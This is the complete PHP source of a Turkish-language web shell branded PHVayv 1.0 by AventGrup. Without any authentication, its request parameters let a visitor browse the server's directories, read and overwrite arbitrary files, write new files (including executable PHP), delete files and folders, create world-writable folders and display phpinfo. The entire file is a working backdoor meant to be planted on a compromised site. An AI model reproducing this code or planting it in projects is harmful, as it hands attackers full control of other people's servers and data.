<? if($sistembilgisi > "") {phpinfo();} else { ?>


<?$fistik=PHVayv;?>


<?if ($sildos>"") {unlink("$dizin/$sildos");} ?>

<?if ($dizin== ""){$dizin=realpath('.');}{$dizin=realpath($dizin);}?>

<?if ($silklas > ""){rmdir($silklas);}?>

<?if ($yeniklasor > "") {mkdir("$dizin/$duzenx2",777);}?>



<?if ($yenidosya == "1") {
$baglan=fopen("$dizin/$duzenx2",'w');
fwrite($baglan,$duzenx);
fclose($baglan);}
?>




<?if ($duzkaydet > "") {

$baglan=fopen($duzkaydet,'w');
fwrite($baglan,$duzenx);
fclose($baglan);}
?>




<?if ($yenklas>"") {;?>
<body topmargin="0" leftmargin="0">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    AventGrup©<br>
    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
    <span style="font-weight: 700">
    <br>
    PHVayv 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="http://www.aventgrup.net" style="text-decoration: none">
    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  </table>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalýþýlan </span></font>
        <font face="Verdana" style="font-size: 8pt">Dizin</font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
</table>

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber30" height="184">
  <tr>
    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#9F9F9F" align="center" height="144">
    <form method="POST" action="<?echo "$fistik.php?yeniklasor=1&dizin=$dizin"?>" 
      <p align="center"><br>
      <font
                color="#FFFFFF" size="1" face="Arial">
<input
                type="text" size="37" maxlength="32"
                name="duzenx2" value="Klasör Adý"
                class="search"
                onblur="if (this.value == '') this.value = 'Kullanýcý'"
                onfocus="if (this.value == 'Kullanýcý') this.value=''"
                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"></font></p>
<p align="center">
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Kaydet"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></span><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
&nbsp;</font></b></p>
</form>
</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#000000" align="center" height="19">
    &nbsp;</td>
  </tr>
  </table>
  


<? } else { ?>




<?if ($yendos>"") {;
?>

<body topmargin="0" leftmargin="0">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    AventGrup©<br>
    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
    <span style="font-weight: 700">
    <br>
    PHVayv 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="http://www.aventgrup.net" style="text-decoration: none">
    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  </table>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalýþýlan </span></font>
        <font face="Verdana" style="font-size: 8pt">Dizin</font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
</table>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="495">
  <tr>
    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#9F9F9F" align="center" height="455">
    <form method="POST" action="<?echo "$fistik.php?yenidosya=1&dizin=$dizin"?>" 
      <p align="center"><br>
      <font
                color="#FFFFFF" size="1" face="Arial">
<input
                type="text" size="50" maxlength="32"
                name="duzenx2" value="Dosya Adý"
                class="search"
                onblur="if (this.value == '') this.value = 'Kullanýcý'"
                onfocus="if (this.value == 'Kullanýcý') this.value=''"
                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"></font></p>
<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
          <textarea name="duzenx" 
          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
        
          
          rows="24" cols="122" wrap="OFF">XXXX</textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
<br>
</font></b>
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Kaydet"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span><br>
&nbsp;</p>
</form>
</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#000000" align="center" height="19">
    &nbsp;</td>
  </tr>
  </table>
  


<? } else { ?>





<?if ($duzenle>"") {; 
?>




<body topmargin="0" leftmargin="0">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    AventGrup©<br>
    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
    <span style="font-weight: 700">
    <br>
    PHVayv 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="http://www.aventgrup.net" style="text-decoration: none">
    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  </table>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="1">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="1"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalýþýlan Dosya</span></font></td>
        <td bgcolor="#D6D6D6" height="1">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4" height="19">
          <tr>
            <td width="1" height="19"></td>
            <td rowspan="2" height="19"><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin/$duzenle"?></font></td>
          </tr>
          <tr>
            <td width="1" height="1"></td>
          </tr>
        </table>
        </td>
      </tr>
</table>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
  <tr>
    <td width="100%" bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#9F9F9F">
    <form method="POST" action="<?echo "PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin"?>" name="kaypos">
<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
          <br>
          <textarea name="duzenx" 
          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
        
          
          rows="24" cols="122" wrap="OFF"><?$baglan=fopen("$dizin/$duzenle",'r');
while(! feof ( $baglan ) ){
$okunan=fgets($baglan,1024);
echo $okunan;
} fclose($baglan); ?></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
<br>
</font></b>
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Kaydet"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></p>
</form>
</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#000000">
    &nbsp;</td>
  </tr>
  </table>











<?
} else {
?>



<html>

<head>
<meta http-equiv="Content-Language" content="tr">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>PHVayv 1.0</title>
</head>

<body topmargin="0" leftmargin="0">

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    AventGrup©<br>
    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
    <span style="font-weight: 700">
    <br>
    PHVayv 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="http://www.aventgrup.net" style="text-decoration: none">
    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  </table>



    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Çalýþýlan Klasör</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
            <td width="65">
            <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" height="13">
              <tr>
                <td width="100%" bgcolor="#B7B7B7" bordercolor="#9F9F9F" height="13"
                onmouseover='this.style.background="D9D9D9"'
                onmouseout='this.style.background="9F9F9F"'
                style="CURSOR: hand"
                
                
                
                
                >
                <p align="center"><font face="Verdana" style="font-size: 8pt">






                <a href="<?echo "$fistik.php?dizin=$dizin/../"?>" style="text-decoration: none">
                <font color="#000000">Üst Klasör</font></a></font></td>

              </tr>
            </table>
            </td>
          </tr>
        </table>
        </td>
      </tr>
    </table>



<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3" height="21">
  <tr>
    <td width="625" bgcolor="#000000"><span style="font-size: 2pt">&nbsp;</span></td>
  </tr>
  <tr>
    <td bgcolor="#000000" height="20">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#000000" id="AutoNumber23" bgcolor="#A3A3A3" width="373" height="19">
      <tr>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber26">
          <tr>
        <td align="center" bgcolor="#5F5F5F" 
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
        
        height="19" bordercolor="#000000">
        <span style="font-weight: 700">
        <font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
        <a color="#9F9F9F" target="_blank" href="<?echo "$fistik.php?sistembilgisi=1";?>" style="text-decoration: none"><font color="#9F9F9F">Sistem Bilgisi</font></a></font></font></span></td>
          </tr>
        </table>
        </td>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber27">
          <tr>
        <td align="center" bgcolor="#5F5F5F" height="19" 
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
        bordercolor="#000000">
        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
        <a href="<?echo "$fistik.php?yenklas=1&dizin=$dizin";?>" style="text-decoration: none">
        <font color="#9F9F9F">Yeni Klasör</font></a></font></td>
          </tr>
        </table>
        </td>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber28">
          <tr>
        <td align="center" bgcolor="#5F5F5F" height="19"
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
		bordercolor="#000000">
        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
        <a href="<?echo "$fistik.php?yendos=1&dizin=$dizin";?>" style="text-decoration: none"><font color="#9F9F9F">Yeni Dosya</font></a> </font></td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
  </table>

  





<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber7" height="17">
  <tr>
    <td width="30" height="17" bgcolor="#9F9F9F">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Tür</font></td>
    <td height="17" bgcolor="#9F9F9F">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Dosya 
    Adý</font></td>
    <td width="122" height="17" bgcolor="#9F9F9F">
    <p align="center">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Ýþlem</font></td>
  </tr>
</table>

<?
if ($sedat=@opendir($dizin)){
while (($ekinci=readdir ($sedat))){
if (is_dir("$dizin/$ekinci")){
?>

<? if ($ekinci=="." or  $ekinci=="..") {
} else {
?>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="17">
  <tr>
    <td width="30" height="17" bgcolor="#808080">
    <p align="center">
    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif"></td>
    <td height="17" bgcolor="#C4C4C4">
    <font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$ekinci" ?></font></td>
    <td width="61" height="17" bgcolor="#C4C4C4" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber15" height="20">
      <tr>
        <td width="100%" bgcolor="#A3A3A3"
        onmouseover="this.style.background='#BBBBBB'"
        onmouseout="this.style.background='#A3A3A3'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="<?echo "$fistik.php?dizin=$dizin/" ?><?echo "$ekinci";?>" style="text-decoration: none">
        <font color="#000000">Aç</font></a></font></td>
      </tr>
    </table>
    </td>
    <td width="60" height="17" bgcolor="#C4C4C4" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber18" height="20">
      <tr>
        <td width="100%" bgcolor="#A3A3A3"
        onmouseover="this.style.background='#BBBBBB'"
        onmouseout="this.style.background='#A3A3A3'"


        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="<?echo "$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin"?>" style="text-decoration: none">
        <font color="#000000">Sil</font></a>

        </font></td>
      </tr>
    </table>
    </td>
  </tr>
</table>
<?
}
?>

<?
}}}
closedir($sedat);
?>

<?
if ($sedat=@opendir($dizin)){
while (($ekinci=readdir ($sedat))){
if (is_file("$dizin/$ekinci")){

?>

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="1">
  <tr>
    <td width="30" height="1" bgcolor="#B0B0B0">
    <p align="center">
    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif"></td>
    <td height="1" bgcolor="#EAEAEA">
    <font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$ekinci" ?></font>
    <font face="Arial Narrow" style="font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( XXX )&nbsp;</font></td>
    <td width="61" height="1" bgcolor="#D6D6D6" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber12" height="20">
      <tr>
        <td width="100%" bgcolor="#D6D6D6"
        onmouseover="this.style.background='#ACACAC'"
        onmouseout="this.style.background='#D6D6D6'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a style="text-decoration: none" target="_self" href="<?echo "$fistik";?>.php?duzenle=<?echo "$ekinci";?>&dizin=<?echo $dizin;?>">
        <font color="#000000">Düzenle</font></a></font></td>
      </tr>
    </table>
    </td>
    <td width="60" height="1" bgcolor="#D6D6D6" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber13" height="100%">
      <tr>
        <td width="100%" bgcolor="#D6D6D6" no wrap
        onmouseover="this.style.background='#ACACAC'"
        onmouseout="this.style.background='#D6D6D6'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="<?echo "$fistik";?>.php?sildos=<?echo $ekinci;?>&dizin=<?echo $dizin;?>" style="text-decoration: none">
        <font color="#000000">Sil</font></a></font></td>
      </tr>
    </table>
    </td>
  </tr>
</table>

<?
}}}
closedir($sedat);
?>





<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber29">
  <tr>
    <td width="100%" bgcolor="#000000">&nbsp;</td>
  </tr>
</table>

  <tr>
    <td width="100%" bgcolor="#000000">
    </body></html><? } ?><? } ?><? } ?><? } ?>